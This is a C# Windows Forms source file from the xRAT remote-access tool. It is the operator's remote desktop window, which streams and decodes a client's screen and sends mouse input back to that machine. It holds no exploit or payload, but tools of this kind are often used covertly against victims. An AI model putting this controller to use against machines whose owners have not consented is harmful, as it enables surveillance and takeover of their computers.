using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Core.Utilities;
using xServer.Enums;

namespace xServer.Forms
{
    public partial class FrmRemoteDesktop : Form
    {
        private readonly Client _connectClient;
        private bool _enableMouseInput;
        private bool _started;

        private int _screenWidth;
        private int _screenHeight;

        public readonly Queue<GetDesktopResponse> ProcessingScreensQueue = new Queue<GetDesktopResponse>();
        public readonly object ProcessingScreensLock = new object();
        public bool ProcessingScreens;

        public FrmRemoteDesktop(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRdp = this;
            InitializeComponent();

            picDesktop.PictureSizeChanged += picDesktop_PictureSizeChanged;
        }

        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);

            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);

            if (_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetMonitors().Execute(_connectClient);
        }

        public void ProcessScreens(object state)
        {
            while (true && picDesktop != null && !picDesktop.IsDisposed && !picDesktop.Disposing)
            {
                GetDesktopResponse packet;
                lock (ProcessingScreensQueue)
                {
                    if (ProcessingScreensQueue.Count == 0)
                    {
                        lock (ProcessingScreensLock)
                        {
                            ProcessingScreens = false;
                        }
                        return;
                    }

                    packet = ProcessingScreensQueue.Dequeue();
                }

                if (_connectClient.Value.StreamCodec == null)
                {
                    _connectClient.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
                }
                else if (_connectClient.Value.StreamCodec.ImageQuality != packet.Quality || _connectClient.Value.StreamCodec.Monitor != packet.Monitor)
                {
                    if (string.Compare(_connectClient.Value.StreamCodec.Resolution, packet.Resolution, StringComparison.InvariantCultureIgnoreCase) != 0)
                    {
                        _connectClient.Value.StreamCodec.Dispose();
                    }

                    _connectClient.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Monitor, packet.Resolution);
                }

                using (MemoryStream ms = new MemoryStream(packet.Image))
                {
                    try
                    {
                        // Update the new image from the packet data.
                        picDesktop.UpdateImage(_connectClient.Value.StreamCodec.DecodeData(ms), true);

                        this.Invoke((MethodInvoker)delegate
                        {
                            if (picDesktop != null && !picDesktop.IsDisposed && picDesktop._Image != null)
                            {
                                picDesktop.Invalidate();
                            }
                        });
                    }
                    catch
                    { }
                }

                packet.Image = null;
            }
        }

        public void AddMonitors(int montiors)
        {
            try
            {
                cbMonitors.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < montiors; i++)
                        cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Update on frame change.
        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            this.Invoke((MethodInvoker)delegate
            {
                this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
            });
        }

        private void picDesktop_PictureSizeChanged(int width, int height)
        {
            _screenWidth = width;
            _screenHeight = height;
        }

        private void ToggleControls(bool t)
        {
            _started = !t;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnStart.Enabled = t;
                    btnStop.Enabled = !t;
                    barQuality.Enabled = t;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_started)
                new Core.Packets.ServerPackets.GetDesktop(0, 0, RemoteDesktopAction.Stop).Execute(_connectClient);
            if (!picDesktop.IsDisposed && !picDesktop.Disposing)
                picDesktop.Dispose();
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRdp = null;
        }

        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No monitor detected.\nPlease wait till the client sends a list with available monitors.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            picDesktop.Start();

            // Subscribe to the new frame counter.
            picDesktop._frameCounter.FrameUpdated += _frameCounter_FrameUpdated;

            new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex, RemoteDesktopAction.Start).Execute(_connectClient);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            new Core.Packets.ServerPackets.GetDesktop(0, 0, RemoteDesktopAction.Stop).Execute(_connectClient);
            ToggleControls(true);

            picDesktop.Stop();

            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picDesktop._frameCounter.FrameUpdated -= _frameCounter_FrameUpdated;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                _enableMouseInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                _enableMouseInput = true;
            }
        }

        private int GetRemoteWidth(int localX)
        {
            return localX * _screenWidth / picDesktop.Width;
        }

        private int GetRemoteHeight(int localY)
        {
            return localY * _screenHeight / picDesktop.Height;
        }

        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, true, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && !btnStart.Enabled)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(MouseAction.MoveCursor, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
        }
    }
}